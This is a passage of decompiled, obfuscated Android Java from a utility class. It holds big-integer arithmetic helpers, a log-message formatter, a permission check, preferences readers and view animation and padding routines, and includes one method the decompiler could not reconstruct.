        for (int i4 = 0; i4 < i2; i4++) {
            int i5 = i3 + i4;
            long j3 = (((long) iArr[i4]) & 4294967295L) + (4294967295L & ((long) iArr2[i5])) + j2;
            iArr2[i5] = (int) j3;
            j2 = j3 >>> 32;
        }
        return (int) j2;
    }

    public static boolean h0(int[] iArr) {
        for (int i2 = 0; i2 < 8; i2++) {
            if (iArr[i2] != 0) {
                return false;
            }
        }
        return true;
    }

    public static int i(int i2, int[] iArr, int[] iArr2) {
        long j2 = 0;
        for (int i3 = 0; i3 < i2; i3++) {
            long j3 = (((long) iArr[i3]) & 4294967295L) + (4294967295L & ((long) iArr2[i3])) + j2;
            iArr2[i3] = (int) j3;
            j2 = j3 >>> 32;
        }
        return (int) j2;
    }

    public static boolean i0(int[] iArr, int i2) {
        for (int i3 = 0; i3 < i2; i3++) {
            if (iArr[i3] != 0) {
                return false;
            }
        }
        return true;
    }

    public static int j(int[] iArr, int[] iArr2) {
        long j2 = (((long) iArr[8]) & 4294967295L) + (((long) iArr2[16]) & 4294967295L);
        int i2 = (int) j2;
        iArr[8] = i2;
        iArr2[16] = i2;
        long j3 = (((long) iArr[9]) & 4294967295L) + (((long) iArr2[17]) & 4294967295L) + (j2 >>> 32);
        int i3 = (int) j3;
        iArr[9] = i3;
        iArr2[17] = i3;
        long j4 = (((long) iArr[10]) & 4294967295L) + (((long) iArr2[18]) & 4294967295L) + (j3 >>> 32);
        int i4 = (int) j4;
        iArr[10] = i4;
        iArr2[18] = i4;
        long j5 = (((long) iArr[11]) & 4294967295L) + (((long) iArr2[19]) & 4294967295L) + (j4 >>> 32);
        int i5 = (int) j5;
        iArr[11] = i5;
        iArr2[19] = i5;
        long j6 = (((long) iArr[12]) & 4294967295L) + (((long) iArr2[20]) & 4294967295L) + (j5 >>> 32);
        int i6 = (int) j6;
        iArr[12] = i6;
        iArr2[20] = i6;
        long j7 = (((long) iArr[13]) & 4294967295L) + (((long) iArr2[21]) & 4294967295L) + (j6 >>> 32);
        int i7 = (int) j7;
        iArr[13] = i7;
        iArr2[21] = i7;
        long j8 = (((long) iArr[14]) & 4294967295L) + (((long) iArr2[22]) & 4294967295L) + (j7 >>> 32);
        int i8 = (int) j8;
        iArr[14] = i8;
        iArr2[22] = i8;
        long j9 = (((long) iArr[15]) & 4294967295L) + (4294967295L & ((long) iArr2[23])) + (j8 >>> 32);
        int i9 = (int) j9;
        iArr[15] = i9;
        iArr2[23] = i9;
        return (int) (j9 >>> 32);
    }

    public static boolean j0(long[] jArr) {
        for (int i2 = 0; i2 < 4; i2++) {
            if (jArr[i2] != 0) {
                return false;
            }
        }
        return true;
    }

    public static void k(int i2, int i3, int i4, int[] iArr) {
        long j2 = (((long) i3) & 4294967295L) + (4294967295L & ((long) iArr[i4]));
        iArr[i4] = (int) j2;
        if ((j2 >>> 32) == 0) {
            return;
        }
        a0(i2, i4 + 1, iArr);
    }

    public static int k0(int i2, float f2, int i3) {
        return dg.c(dg.e(i3, Math.round(Color.alpha(i3) * f2)), i2);
    }

    public static int l(int i2, int i3, int[] iArr) {
        long j2 = (((long) i3) & 4294967295L) + (4294967295L & ((long) iArr[0]));
        iArr[0] = (int) j2;
        if ((j2 >>> 32) == 0) {
            return 0;
        }
        return a0(i2, 1, iArr);
    }

    public static int l0(int i2, int[] iArr, int[] iArr2) {
        long j2 = 0;
        for (int i3 = 0; i3 < i2; i3++) {
            j2 = (((((long) iArr[i3]) & 4294967295L) - (4294967295L & ((long) iArr2[i3]))) + j2) >> 32;
        }
        return (int) j2;
    }

    /* JADX WARN: Removed duplicated region for block: B:31:0x0079  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public static final defpackage.p50 m(java.lang.String r7, java.lang.Object[] r8, java.lang.Throwable r9) {
        /*
            r0 = 0
            if (r7 != 0) goto L9
            p50 r7 = new p50
            r7.<init>(r0, r8, r9)
            return r7
        L9:
            if (r8 != 0) goto L11
            p50 r8 = new p50
            r8.<init>(r7, r0, r0)
            return r8
        L11:
            java.lang.StringBuilder r0 = new java.lang.StringBuilder
            int r1 = r7.length()
            int r1 = r1 + 50
            r0.<init>(r1)
            r1 = 0
            r2 = r1
        L1e:
            int r3 = r8.length
            if (r1 >= r3) goto L8a
            java.lang.String r3 = "{}"
            int r3 = r7.indexOf(r3, r2)
            r4 = -1
            if (r3 != r4) goto L43
            if (r2 != 0) goto L32
            p50 r0 = new p50
            r0.<init>(r7, r8, r9)
            return r0
        L32:
            int r1 = r7.length()
            r0.append(r7, r2, r1)
            p50 r7 = new p50
            java.lang.String r0 = r0.toString()
            r7.<init>(r0, r8, r9)
            return r7
        L43:
            if (r3 != 0) goto L46
            goto L79
        L46:
            int r4 = r3 + (-1)
            char r5 = r7.charAt(r4)
            r6 = 92
            if (r5 != r6) goto L79
            r5 = 2
            if (r3 < r5) goto L6c
            int r5 = r3 + (-2)
            char r5 = r7.charAt(r5)
            if (r5 != r6) goto L6c
            r0.append(r7, r2, r4)
            r2 = r8[r1]
            java.util.HashMap r4 = new java.util.HashMap
            r4.<init>()
            z(r0, r2, r4)
        L68:
            int r3 = r3 + 2
        L6a:
            r2 = r3
            goto L87
        L6c:
            int r1 = r1 + (-1)
            r0.append(r7, r2, r4)
            r2 = 123(0x7b, float:1.72E-43)
            r0.append(r2)
            int r3 = r3 + 1
            goto L6a
        L79:
            r0.append(r7, r2, r3)
            r2 = r8[r1]
            java.util.HashMap r4 = new java.util.HashMap
            r4.<init>()
            z(r0, r2, r4)
            goto L68
        L87:
            int r1 = r1 + 1
            goto L1e
        L8a:
            int r1 = r7.length()
            r0.append(r7, r2, r1)
            p50 r7 = new p50
            java.lang.String r0 = r0.toString()
            r7.<init>(r0, r8, r9)
            return r7
        */
        throw new UnsupportedOperationException("Method not decompiled: defpackage.fa0.m(java.lang.String, java.lang.Object[], java.lang.Throwable):p50");
    }

    public static void m0(int[] iArr, int[] iArr2, int[] iArr3) {
        long j2 = ((long) iArr2[0]) & 4294967295L;
        long j3 = ((long) iArr2[1]) & 4294967295L;
        long j4 = ((long) iArr2[2]) & 4294967295L;
        long j5 = ((long) iArr2[3]) & 4294967295L;
        long j6 = ((long) iArr2[4]) & 4294967295L;
        long j7 = ((long) iArr2[5]) & 4294967295L;
        long j8 = ((long) iArr2[6]) & 4294967295L;
        long j9 = ((long) iArr2[7]) & 4294967295L;
        long j10 = ((long) iArr[0]) & 4294967295L;
        long j11 = j10 * j2;
        iArr3[0] = (int) j11;
        long j12 = (j10 * j3) + (j11 >>> 32);
        iArr3[1] = (int) j12;
        long j13 = (j10 * j4) + (j12 >>> 32);
        iArr3[2] = (int) j13;
        long j14 = (j10 * j5) + (j13 >>> 32);
        iArr3[3] = (int) j14;
        long j15 = (j10 * j6) + (j14 >>> 32);
        iArr3[4] = (int) j15;
        long j16 = (j10 * j7) + (j15 >>> 32);
        iArr3[5] = (int) j16;
        long j17 = (j10 * j8) + (j16 >>> 32);
        iArr3[6] = (int) j17;
        long j18 = (j10 * j9) + (j17 >>> 32);
        iArr3[7] = (int) j18;
        int i2 = (int) (j18 >>> 32);
        iArr3[8] = i2;
        int i3 = 1;
        for (int i4 = 8; i3 < i4; i4 = 8) {
            long j19 = ((long) iArr[i3]) & 4294967295L;
            long j20 = j6;
            long j21 = (j19 * j2) + (((long) iArr3[i3]) & 4294967295L);
            iArr3[i3] = (int) j21;
            int i5 = i3 + 1;
            long j22 = (j19 * j3) + (((long) iArr3[i5]) & 4294967295L) + (j21 >>> 32);
            iArr3[i5] = (int) j22;
            int i6 = i3 + 2;
            long j23 = (j19 * j4) + (((long) iArr3[i6]) & 4294967295L) + (j22 >>> 32);
            iArr3[i6] = (int) j23;
            int i7 = i3 + 3;
            long j24 = (j19 * j5) + (((long) iArr3[i7]) & 4294967295L) + (j23 >>> 32);
            iArr3[i7] = (int) j24;
            int i8 = i3 + 4;
            long j25 = (j19 * j20) + (((long) iArr3[i8]) & 4294967295L) + (j24 >>> 32);
            iArr3[i8] = (int) j25;
            int i9 = i3 + 5;
            long j26 = (j19 * j7) + (((long) iArr3[i9]) & 4294967295L) + (j25 >>> 32);
            iArr3[i9] = (int) j26;
            int i10 = i3 + 6;
            long j27 = (j19 * j8) + (((long) iArr3[i10]) & 4294967295L) + (j26 >>> 32);
            iArr3[i10] = (int) j27;
            long j28 = j27 >>> 32;
            int i11 = i3 + 7;
            long j29 = (j19 * j9) + (((long) iArr3[i11]) & 4294967295L) + j28;
            iArr3[i11] = (int) j29;
            iArr3[i3 + 8] = (int) (j29 >>> 32);
            i3 = i5;
            j6 = j20;
        }
    }

    public static Rect n(View view, View view2) {
        int[] iArr = new int[2];
        view2.getLocationOnScreen(iArr);
        int i2 = iArr[0];
        int i3 = iArr[1];
        int[] iArr2 = new int[2];
        view.getLocationOnScreen(iArr2);
        int i4 = i2 - iArr2[0];
        int i5 = i3 - iArr2[1];
        return new Rect(i4, i5, view2.getWidth() + i4, view2.getHeight() + i5);
    }

    public static int n0(int[] iArr, int[] iArr2, int[] iArr3) {
        long j2 = ((long) iArr2[0]) & 4294967295L;
        long j3 = ((long) iArr2[1]) & 4294967295L;
        long j4 = ((long) iArr2[2]) & 4294967295L;
        long j5 = ((long) iArr2[3]) & 4294967295L;
        long j6 = ((long) iArr2[4]) & 4294967295L;
        long j7 = ((long) iArr2[5]) & 4294967295L;
        long j8 = ((long) iArr2[6]) & 4294967295L;
        long j9 = ((long) iArr2[7]) & 4294967295L;
        long j10 = 0;
        int i2 = 0;
        while (i2 < 8) {
            long j11 = ((long) iArr[i2]) & 4294967295L;
            long j12 = (j11 * j2) + (((long) iArr3[i2]) & 4294967295L);
            int i3 = i2;
            iArr3[i3] = (int) j12;
            int i4 = i3 + 1;
            long j13 = (j11 * j3) + (((long) iArr3[i4]) & 4294967295L) + (j12 >>> 32);
            iArr3[i4] = (int) j13;
            int i5 = i3 + 2;
            long j14 = (j11 * j4) + (((long) iArr3[i5]) & 4294967295L) + (j13 >>> 32);
            iArr3[i5] = (int) j14;
            int i6 = i3 + 3;
            long j15 = (j11 * j5) + (((long) iArr3[i6]) & 4294967295L) + (j14 >>> 32);
            iArr3[i6] = (int) j15;
            int i7 = i3 + 4;
            long j16 = (j11 * j6) + (((long) iArr3[i7]) & 4294967295L) + (j15 >>> 32);
            iArr3[i7] = (int) j16;
            int i8 = i3 + 5;
            long j17 = (j11 * j7) + (((long) iArr3[i8]) & 4294967295L) + (j16 >>> 32);
            iArr3[i8] = (int) j17;
            int i9 = i3 + 6;
            long j18 = (j11 * j8) + (((long) iArr3[i9]) & 4294967295L) + (j17 >>> 32);
            iArr3[i9] = (int) j18;
            int i10 = i3 + 7;
            long j19 = (j11 * j9) + (((long) iArr3[i10]) & 4294967295L) + (j18 >>> 32);
            iArr3[i10] = (int) j19;
            int i11 = i3 + 8;
            long j20 = (j19 >>> 32) + (((long) iArr3[i11]) & 4294967295L) + j10;
            iArr3[i11] = (int) j20;
            j10 = j20 >>> 32;
            i2 = i4;
        }
        return (int) j10;
    }

    public static int o(Context context, String str) {
        int iC;
        int iMyPid = Process.myPid();
        int iMyUid = Process.myUid();
        String packageName = context.getPackageName();
        if (context.checkPermission(str, iMyPid, iMyUid) != -1) {
            String strD = u7.d(str);
            if (strD != null) {
                if (packageName == null) {
                    String[] packagesForUid = context.getPackageManager().getPackagesForUid(iMyUid);
                    if (packagesForUid != null && packagesForUid.length > 0) {
                        packageName = packagesForUid[0];
                    }
                }
                int iMyUid2 = Process.myUid();
                String packageName2 = context.getPackageName();
                if (iMyUid2 == iMyUid && Objects.equals(packageName2, packageName) && Build.VERSION.SDK_INT >= 29) {
                    AppOpsManager appOpsManagerC = v7.c(context);
                    iC = v7.a(appOpsManagerC, strD, Binder.getCallingUid(), packageName);
                    if (iC == 0) {
                        iC = v7.a(appOpsManagerC, strD, iMyUid, v7.b(context));
                    }
                } else {
                    iC = u7.c((AppOpsManager) u7.a(context, AppOpsManager.class), strD, packageName);
                }
                if (iC != 0) {
                    return -2;
                }
            }
            return 0;
        }
        return -1;
    }

    public static void o0(long[] jArr, long[] jArr2, long[] jArr3) {
        long[] jArr4 = new long[8];
        W(jArr, jArr2, jArr4);
        s0(jArr4, jArr3);
    }

    public static long p(long j2, long j3, long j4) {
        if (j3 <= j4) {
            return j2 < j3 ? j3 : j2 > j4 ? j4 : j2;
        }
        throw new IllegalArgumentException("Cannot coerce value to an empty range: maximum " + j4 + " is less than minimum " + j3 + '.');
    }

    public static PorterDuff.Mode p0(int i2, PorterDuff.Mode mode) {
        if (i2 == 3) {
            return PorterDuff.Mode.SRC_OVER;
        }
        if (i2 == 5) {
            return PorterDuff.Mode.SRC_IN;
        }
        if (i2 == 9) {
            return PorterDuff.Mode.SRC_ATOP;
        }
        switch (i2) {
            case WorkDatabaseVersions.VERSION_14 /* 14 */:
                return PorterDuff.Mode.MULTIPLY;
            case WorkDatabaseVersions.VERSION_15 /* 15 */:
                return PorterDuff.Mode.SCREEN;
            case 16:
                return PorterDuff.Mode.ADD;
            default:
                return mode;
        }
    }

    public static int q(int i2, int i3) {
        return dg.e(i2, (Color.alpha(i2) * i3) / 255);
    }

    public static String q0(Context context, String str, String str2) {
        return context.getSharedPreferences(context.getPackageName(), 0).getString(str, str2);
    }

    public static int r(un0 un0Var, ws wsVar, View view, View view2, k kVar, boolean z2) {
        if (kVar.v() == 0 || un0Var.b() == 0 || view == null || view2 == null) {
            return 0;
        }
        if (!z2) {
            return Math.abs(k.H(view) - k.H(view2)) + 1;
        }
        return Math.min(wsVar.l(), wsVar.b(view2) - wsVar.e(view));
    }

    public static boolean r0(Context context, String str, boolean z2) {
        return context.getSharedPreferences(context.getPackageName(), 0).getBoolean(str, z2);
    }

    public static int s(un0 un0Var, ws wsVar, View view, View view2, k kVar, boolean z2, boolean z3) {
        if (kVar.v() == 0 || un0Var.b() == 0 || view == null || view2 == null) {
            return 0;
        }
        int iMax = z3 ? Math.max(0, (un0Var.b() - Math.max(k.H(view), k.H(view2))) - 1) : Math.max(0, Math.min(k.H(view), k.H(view2)));
        if (z2) {
            return Math.round((iMax * (Math.abs(wsVar.b(view2) - wsVar.e(view)) / (Math.abs(k.H(view) - k.H(view2)) + 1))) + (wsVar.k() - wsVar.e(view)));
        }
        return iMax;
    }

    public static void s0(long[] jArr, long[] jArr2) {
        long j2 = jArr[0];
        long j3 = jArr[1];
        long j4 = jArr[2];
        long j5 = jArr[3];
        long j6 = jArr[4];
        long j7 = jArr[5];
        long j8 = jArr[6];
        long j9 = jArr[7];
        long j10 = j8 ^ (j9 >>> 17);
        long j11 = (j7 ^ (j9 << 47)) ^ (j10 >>> 17);
        long j12 = ((j6 ^ (j9 >>> 47)) ^ (j10 << 47)) ^ (j11 >>> 17);
        long j13 = j2 ^ (j12 << 17);
        long j14 = (j3 ^ (j11 << 17)) ^ (j12 >>> 47);
        long j15 = ((j4 ^ (j10 << 17)) ^ (j11 >>> 47)) ^ (j12 << 47);
        long j16 = (((j5 ^ (j9 << 17)) ^ (j10 >>> 47)) ^ (j11 << 47)) ^ (j12 >>> 17);
        long j17 = j16 >>> 47;
        jArr2[0] = j13 ^ j17;
        jArr2[1] = j14;
        jArr2[2] = (j17 << 30) ^ j15;
        jArr2[3] = 140737488355327L & j16;
    }

    public static int t(un0 un0Var, ws wsVar, View view, View view2, k kVar, boolean z2) {
        if (kVar.v() == 0 || un0Var.b() == 0 || view == null || view2 == null) {
            return 0;
        }
        if (!z2) {
            return un0Var.b();
        }
        return (int) (((wsVar.b(view2) - wsVar.e(view)) / (Math.abs(k.H(view) - k.H(view2)) + 1)) * un0Var.b());
    }

    public static void t0(TextView textView, int i2) {
        la0.g(i2);
        if (Build.VERSION.SDK_INT >= 28) {
            e01.d(textView, i2);
            return;
        }
        Paint.FontMetricsInt fontMetricsInt = textView.getPaint().getFontMetricsInt();
        int i3 = textView.getIncludeFontPadding() ? fontMetricsInt.top : fontMetricsInt.ascent;
        if (i2 > Math.abs(i3)) {
            textView.setPadding(textView.getPaddingLeft(), i2 + i3, textView.getPaddingRight(), textView.getPaddingBottom());
        }
    }

    public static void u(int i2, int[] iArr, int[] iArr2) {
        iArr2[i2] = iArr[0];
        iArr2[i2 + 1] = iArr[1];
        iArr2[i2 + 2] = iArr[2];
        iArr2[i2 + 3] = iArr[3];
        iArr2[i2 + 4] = iArr[4];
        iArr2[i2 + 5] = iArr[5];
        iArr2[i2 + 6] = iArr[6];
        iArr2[i2 + 7] = iArr[7];
    }

    public static void u0(TextView textView, int i2) {
        la0.g(i2);
        Paint.FontMetricsInt fontMetricsInt = textView.getPaint().getFontMetricsInt();
        int i3 = textView.getIncludeFontPadding() ? fontMetricsInt.bottom : fontMetricsInt.descent;
        if (i2 > Math.abs(i3)) {
            textView.setPadding(textView.getPaddingLeft(), textView.getPaddingTop(), textView.getPaddingRight(), i2 - i3);
        }
    }

    public static void v(int i2, long[] jArr, long[] jArr2) {
        jArr2[i2] = jArr[0];
        jArr2[i2 + 1] = jArr[1];
        jArr2[i2 + 2] = jArr[2];
        jArr2[i2 + 3] = jArr[3];
    }

    public static int v0(int i2, int i3, int[] iArr, int[] iArr2) {
        int i4 = 0;
        while (i4 < i2) {
            int i5 = iArr[i4];
            iArr2[i4] = (i3 >>> 31) | (i5 << 1);
            i4++;
            i3 = i5;
        }
        return i3 >>> 31;
    }

    public static void w(long[] jArr, long[] jArr2) {
        jArr2[0] = jArr[0];
        jArr2[1] = jArr[1];
        jArr2[2] = jArr[2];
        jArr2[3] = jArr[3];
    }

    public static int w0(int i2, int[] iArr, int[] iArr2) {
        int i3 = 0;
        int i4 = 0;
        while (i3 < i2) {
            int i5 = iArr[i3];
            iArr2[i3] = (i4 >>> (-3)) | (i5 << 3);
            i3++;
            i4 = i5;
        }
        return i4 >>> (-3);
    }

    public static ObjectAnimator x(View view, a21 a21Var, int i2, int i3, float f2, float f3, float f4, float f5, BaseInterpolator baseInterpolator, Visibility visibility) {
        float f6;
        float translationX = view.getTranslationX();
        float translationY = view.getTranslationY();
        if (((int[]) a21Var.b.getTag(R$id.transition_position)) != null) {
            f2 = (r5[0] - i2) + translationX;
            f6 = (r5[1] - i3) + translationY;
        } else {
            f6 = f3;
        }
        view.setTranslationX(f2);
        view.setTranslationY(f6);
        if (f2 == f4 && f6 == f5) {
            return null;
        }
        ObjectAnimator objectAnimatorOfPropertyValuesHolder = ObjectAnimator.ofPropertyValuesHolder(view, PropertyValuesHolder.ofFloat((Property<?, Float>) View.TRANSLATION_X, f2, f4), PropertyValuesHolder.ofFloat((Property<?, Float>) View.TRANSLATION_Y, f6, f5));
        b21 b21Var = new b21(view, a21Var.b, translationX, translationY);
        visibility.a(b21Var);
        objectAnimatorOfPropertyValuesHolder.addListener(b21Var);
        objectAnimatorOfPropertyValuesHolder.setInterpolator(baseInterpolator);
        return objectAnimatorOfPropertyValuesHolder;
    }

    public static int x0(int[] iArr, int i2) {
        int i3 = 0;
        int i4 = 0;
        while (i3 < i2) {
            int i5 = iArr[i3];
            iArr[i3] = (i4 >>> (-2)) | (i5 << 2);
            i3++;
            i4 = i5;
        }
        return i4 >>> (-2);
    }

    public static int y(int i2, int i3, int[] iArr) {
        while (i3 < i2) {
            int i4 = iArr[i3] - 1;
            iArr[i3] = i4;
            if (i4 != -1) {
                return 0;
            }
            i3++;
        }
        return -1;
    }

    public static void y0(int[] iArr, int[] iArr2) {
        long j2 = ((long) iArr[0]) & 4294967295L;
        int i2 = 16;
        int i3 = 0;
        int i4 = 7;
        while (true) {
            int i5 = i4 - 1;
            long j3 = ((long) iArr[i4]) & 4294967295L;
            long j4 = j3 * j3;
            iArr2[i2 - 1] = (i3 << 31) | ((int) (j4 >>> 33));
            i2 -= 2;
            iArr2[i2] = (int) (j4 >>> 1);
            i3 = (int) j4;
            if (i5 <= 0) {
                long j5 = j2 * j2;
                long j6 = (j5 >>> 33) | (((long) (i3 << 31)) & 4294967295L);
                iArr2[0] = (int) j5;
                int i6 = ((int) (j5 >>> 32)) & 1;
                long j7 = ((long) iArr[1]) & 4294967295L;
                long j8 = ((long) iArr2[2]) & 4294967295L;
                long j9 = (j7 * j2) + j6;
                int i7 = (int) j9;
                iArr2[1] = i6 | (i7 << 1);
                long j10 = ((long) iArr[2]) & 4294967295L;
                long j11 = ((long) iArr2[3]) & 4294967295L;
                long j12 = ((long) iArr2[4]) & 4294967295L;
                long j13 = (j10 * j2) + j8 + (j9 >>> 32);
                int i8 = (int) j13;
                iArr2[2] = (i8 << 1) | (i7 >>> 31);
                long jE = zn.e(j10, j7, j13 >>> 32, j11);
                long j14 = j12 + (jE >>> 32);
                long j15 = ((long) iArr[3]) & 4294967295L;
                long j16 = (((long) iArr2[5]) & 4294967295L) + (j14 >>> 32);
                long j17 = j14 & 4294967295L;
                long j18 = (((long) iArr2[6]) & 4294967295L) + (j16 >>> 32);
                long j19 = j16 & 4294967295L;
                long j20 = (j15 * j2) + (jE & 4294967295L);
                int i9 = (int) j20;
                iArr2[3] = (i8 >>> 31) | (i9 << 1);
                int i10 = i9 >>> 31;
                long jE2 = zn.e(j15, j7, j20 >>> 32, j17);
                long jE3 = zn.e(j15, j10, jE2 >>> 32, j19);
                long j21 = j18 + (jE3 >>> 32);
                long j22 = jE3 & 4294967295L;
                long j23 = ((long) iArr[4]) & 4294967295L;
                long j24 = (((long) iArr2[7]) & 4294967295L) + (j21 >>> 32);
                long j25 = (((long) iArr2[8]) & 4294967295L) + (j24 >>> 32);
                long j26 = j24 & 4294967295L;
                long j27 = (j23 * j2) + (jE2 & 4294967295L);
                int i11 = (int) j27;
                iArr2[4] = i10 | (i11 << 1);
                long jE4 = zn.e(j23, j7, j27 >>> 32, j22);
                long jE5 = zn.e(j23, j10, jE4 >>> 32, j21 & 4294967295L);
                long jE6 = zn.e(j23, j15, jE5 >>> 32, j26);
                long j28 = jE5 & 4294967295L;
                long j29 = j25 + (jE6 >>> 32);
                long j30 = jE6 & 4294967295L;
                long j31 = ((long) iArr[5]) & 4294967295L;
                long j32 = (((long) iArr2[9]) & 4294967295L) + (j29 >>> 32);
                long j33 = (((long) iArr2[10]) & 4294967295L) + (j32 >>> 32);
                long j34 = (j31 * j2) + (jE4 & 4294967295L);
                int i12 = (int) j34;
                iArr2[5] = (i11 >>> 31) | (i12 << 1);
                int i13 = i12 >>> 31;
                long jE7 = zn.e(j31, j7, j34 >>> 32, j28);
                long jE8 = zn.e(j31, j10, jE7 >>> 32, j30);
                long jE9 = zn.e(j31, j15, jE8 >>> 32, j29 & 4294967295L);
                long j35 = jE8 & 4294967295L;
                long jE10 = zn.e(j31, j23, jE9 >>> 32, j32 & 4294967295L);
                long j36 = jE9 & 4294967295L;
                long j37 = j33 + (jE10 >>> 32);
                long j38 = ((long) iArr[6]) & 4294967295L;
                long j39 = (((long) iArr2[11]) & 4294967295L) + (j37 >>> 32);
                long j40 = (((long) iArr2[12]) & 4294967295L) + (j39 >>> 32);
                long j41 = (j38 * j2) + (jE7 & 4294967295L);
                int i14 = (int) j41;
                iArr2[6] = i13 | (i14 << 1);
                int i15 = i14 >>> 31;
                long jE11 = zn.e(j38, j7, j41 >>> 32, j35);
                long jE12 = zn.e(j38, j10, jE11 >>> 32, j36);
                long jE13 = zn.e(j38, j15, jE12 >>> 32, jE10 & 4294967295L);
                long j42 = jE12 & 4294967295L;
                long jE14 = zn.e(j38, j23, jE13 >>> 32, j37 & 4294967295L);
                long j43 = jE13 & 4294967295L;
                long jE15 = zn.e(j38, j31, jE14 >>> 32, j39 & 4294967295L);
                long j44 = j40 + (jE15 >>> 32);
                long j45 = ((long) iArr[7]) & 4294967295L;
                long j46 = (((long) iArr2[13]) & 4294967295L) + (j44 >>> 32);
                long j47 = (((long) iArr2[14]) & 4294967295L) + (j46 >>> 32);
                long j48 = j46 & 4294967295L;
                long j49 = (j45 * j2) + (jE11 & 4294967295L);
                int i16 = (int) j49;
                iArr2[7] = (i16 << 1) | i15;
                int i17 = i16 >>> 31;
                long jE16 = zn.e(j45, j7, j49 >>> 32, j42);
                long jE17 = zn.e(j45, j10, jE16 >>> 32, j43);
                long jE18 = zn.e(j45, j15, jE17 >>> 32, jE14 & 4294967295L);
                long jE19 = zn.e(j45, j23, jE18 >>> 32, jE15 & 4294967295L);
                long jE20 = zn.e(j45, j31, jE19 >>> 32, j44 & 4294967295L);
                long jE21 = zn.e(j45, j38, jE20 >>> 32, j48);
                long j50 = j47 + (jE21 >>> 32);
                int i18 = (int) jE16;
                iArr2[8] = (i18 << 1) | i17;
                int i19 = (int) jE17;
                iArr2[9] = (i18 >>> 31) | (i19 << 1);
                int i20 = i19 >>> 31;
                int i21 = (int) jE18;
                iArr2[10] = i20 | (i21 << 1);
                int i22 = i21 >>> 31;
                int i23 = (int) jE19;
                iArr2[11] = i22 | (i23 << 1);
                int i24 = i23 >>> 31;
                int i25 = (int) jE20;
                iArr2[12] = i24 | (i25 << 1);
                int i26 = i25 >>> 31;
                int i27 = (int) jE21;
                iArr2[13] = i26 | (i27 << 1);
                int i28 = i27 >>> 31;
                int i29 = (int) j50;
                iArr2[14] = i28 | (i29 << 1);
                iArr2[15] = ((iArr2[15] + ((int) (j50 >>> 32))) << 1) | (i29 >>> 31);
                return;
            }
            i4 = i5;
        }
    }

    public static void z(StringBuilder sb, Object obj, HashMap map) {
        if (obj == null) {
            sb.append("null");
            return;
        }
        if (!obj.getClass().isArray()) {
            try {
                sb.append(obj.toString());
                return;
            } catch (Throwable th) {
                j31.W("SLF4J: Failed toString() invocation on an object of type [" + obj.getClass().getName() + "]", th);
                sb.append("[FAILED toString()]");
                return;
            }
        }
        int i2 = 0;
        if (obj instanceof boolean[]) {
            boolean[] zArr = (boolean[]) obj;
            sb.append('[');
            int length = zArr.length;
            while (i2 < length) {
                sb.append(zArr[i2]);
                if (i2 != length - 1) {
                    sb.append(", ");
                }
                i2++;
            }
            sb.append(']');
            return;
        }
        if (obj instanceof byte[]) {
            byte[] bArr = (byte[]) obj;
            sb.append('[');
            int length2 = bArr.length;
            while (i2 < length2) {
                sb.append((int) bArr[i2]);
                if (i2 != length2 - 1) {
                    sb.append(", ");
                }
                i2++;
            }
            sb.append(']');
            return;
        }
        if (obj instanceof char[]) {
            char[] cArr = (char[]) obj;
            sb.append('[');
            int length3 = cArr.length;
            while (i2 < length3) {
                sb.append(cArr[i2]);
                if (i2 != length3 - 1) {
                    sb.append(", ");
                }
                i2++;
            }
            sb.append(']');
            return;
        }
        if (obj instanceof short[]) {
            short[] sArr = (short[]) obj;
            sb.append('[');
            int length4 = sArr.length;
            while (i2 < length4) {
                sb.append((int) sArr[i2]);
                if (i2 != length4 - 1) {
                    sb.append(", ");
                }
                i2++;
            }
            sb.append(']');
            return;
        }
        if (obj instanceof int[]) {
            int[] iArr = (int[]) obj;
            sb.append('[');
            int length5 = iArr.length;
            while (i2 < length5) {
                sb.append(iArr[i2]);
                if (i2 != length5 - 1) {
                    sb.append(", ");
                }
                i2++;
            }
            sb.append(']');
            return;
        }
        if (obj instanceof long[]) {
            long[] jArr = (long[]) obj;
            sb.append('[');
            int length6 = jArr.length;
            while (i2 < length6) {
                sb.append(jArr[i2]);
                if (i2 != length6 - 1) {
                    sb.append(", ");
                }
                i2++;
            }
            sb.append(']');
            return;
        }
        if (obj instanceof float[]) {
            float[] fArr = (float[]) obj;
            sb.append('[');
            int length7 = fArr.length;
            while (i2 < length7) {
                sb.append(fArr[i2]);
                if (i2 != length7 - 1) {
                    sb.append(", ");
                }
                i2++;
            }
            sb.append(']');
            return;
        }
        if (obj instanceof double[]) {
            double[] dArr = (double[]) obj;
            sb.append('[');
            int length8 = dArr.length;
            while (i2 < length8) {
                sb.append(dArr[i2]);
                if (i2 != length8 - 1) {
                    sb.append(", ");
                }
                i2++;
            }
            sb.append(']');
            return;
        }
        Object[] objArr = (Object[]) obj;
        sb.append('[');
        if (map.containsKey(objArr)) {
            sb.append("...");
        } else {
            map.put(objArr, null);
            int length9 = objArr.length;
            while (i2 < length9) {
                z(sb, objArr[i2], map);
                if (i2 != length9 - 1) {
                    sb.append(", ");
                }
                i2++;
            }
            map.remove(objArr);
        }
        sb.append(']');
    }

    public static void z0(long[] jArr, long[] jArr2) {
        long[] jArr3 = new long[8];
        qm.o(4, jArr, jArr3);
        s0(jArr3, jArr2);
    }
}
